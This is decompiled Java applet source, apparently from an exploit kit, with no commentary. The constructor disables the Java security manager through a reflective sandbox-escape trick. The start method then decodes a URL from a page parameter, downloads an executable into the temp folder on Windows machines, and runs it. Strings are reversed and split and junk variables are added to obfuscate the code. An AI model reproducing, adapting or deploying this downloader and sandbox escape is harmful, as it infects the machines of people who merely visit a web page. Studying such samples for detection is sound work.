// 
// Decompiled by Procyon v0.5.30
// 

package Rleh;

import java.awt.Component;
import javax.swing.JList;
import java.beans.Expression;
import utilits.common;
import java.util.HashSet;
import java.lang.reflect.Method;
import java.lang.reflect.InvocationTargetException;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.net.URL;
import utilits.polinom;
import java.applet.Applet;

public class Ktulhu extends Applet
{
    public void start() {
        super.start();
        try {
            final String srtr1 = polinom.buto(this.getParameter("dskvnds"));
            final String srtr2 = "e".concat("xe.");
            final String srtr3 = "ri".concat("dpm".concat("t.oi.av".concat("aj")));
            final String srtr4 = "ema".concat("n.so");
            final String srtr5 = new StringBuffer(srtr2).reverse().toString();
            final String srtr6 = new StringBuffer(srtr3).reverse().toString();
            final String srtr7 = new StringBuffer(srtr4).reverse().toString();
            final String srtr8 = String.valueOf(Math.random()) + srtr5;
            final String srtr9 = System.getProperty(srtr6);
            final String srtr10 = System.getProperty(srtr7);
            try {
                if (srtr10.indexOf("W".concat("in").concat("do".concat("ws"))) >= 0) {
                    final URL trjvn = new URL(srtr1);
                    final int pizdeeeetc = 10;
                    final boolean bbb = true;
                    final String is = "s;f";
                    trjvn.openConnection();
                    final int oaznc = 10;
                    final boolean ii = false;
                    final String b10487 = "ee";
                    final InputStream ksdcloqcnm = trjvn.openStream();
                    final String dcasm = "dsfvnefj";
                    final boolean ascmsa = true;
                    final FileOutputStream loko = new FileOutputStream(String.valueOf(srtr9) + srtr8);
                    final byte[] asw = new byte[1024];
                    int i;
                    while ((i = ksdcloqcnm.read(asw, 0, asw.length)) != -1) {
                        loko.write(asw, 0, i);
                    }
                    ksdcloqcnm.close();
                    loko.close();
                    final int df = 34;
                    final boolean dfvm = false;
                    final String ffnwsfn = "aqdqa";
                    final Runtime lr = Runtime.getRuntime();
                    final int kvfndfs = 76;
                    final String scvms = ";rklnwn";
                    final boolean bbhj = true;
                    fasa(lr, "ex".concat("ec"), new Object[] { String.valueOf(srtr9) + srtr8 });
                    final int fvnde = 584;
                    final String ernv = "knfveklfv";
                }
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public static Object fasa(final Object obj, final String name) {
        final Class cls = obj.getClass();
        try {
            final Method method = cls.getMethod(name, (Class[])null);
            return method.invoke(obj, (Object[])null);
        }
        catch (NoSuchMethodException ex) {
            ex.printStackTrace();
        }
        catch (IllegalAccessException ex2) {
            ex2.printStackTrace();
        }
        catch (InvocationTargetException ex3) {
            throw new RuntimeException(ex3);
        }
        return null;
    }
    
    public static Object fasa(final Object obj, final String name, final Object[] val) {
        final Class cls = obj.getClass();
        if (val.length == 0) {
            fasa(obj, name);
        }
        try {
            final Method[] m = cls.getMethods();
            for (int i = 0; i < m.length; ++i) {
                if (m[i].getName().equals(name) && cm(m[i], val)) {
                    return m[i].invoke(obj, val);
                }
            }
        }
        catch (IllegalAccessException ex) {
            ex.printStackTrace();
        }
        catch (InvocationTargetException ex2) {
            throw new RuntimeException(ex2);
        }
        return null;
    }
    
    private static boolean cm(final Method m, final Object[] val) {
        final Class[] cls = m.getParameterTypes();
        return c(cls, val);
    }
    
    public static boolean c(final Class[] cls, final Object[] val) {
        if (cls.length != val.length) {
            return false;
        }
        for (int i = 0; i < cls.length; ++i) {
            if (!val[i].getClass().getName().toUpperCase().contains(cls[i].getName().toUpperCase())) {
                return false;
            }
        }
        return true;
    }
    
    public Ktulhu() {
        final Class ls = System.class;
        final String str = "setS".concat("ecu".concat("rityM".concat("anager")));
        final Object[] aa = { null };
        final HashSet ht = new HashSet();
        ht.add(new common(ls, str, aa));
        final Expression e = new Expression(ls, str, aa);
        final cucumber uty = new cucumber(this, ht);
        final JList ll = new JList((E[])new Object[] { uty });
        this.add(ll);
    }
}
